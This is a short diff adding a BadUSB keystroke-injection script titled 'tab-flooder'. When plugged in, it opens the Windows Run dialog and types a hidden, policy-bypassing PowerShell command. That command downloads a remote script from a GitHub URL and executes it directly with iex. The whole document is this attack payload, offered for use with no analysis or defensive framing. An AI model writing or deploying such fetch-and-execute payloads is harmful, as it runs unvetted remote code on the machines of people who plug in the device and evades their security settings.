@@ -1,0 +1,5 @@
+REM tab-flooder with powershell
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/tab-flooder/tab-flooder2.ps1 | iex
+ENTER
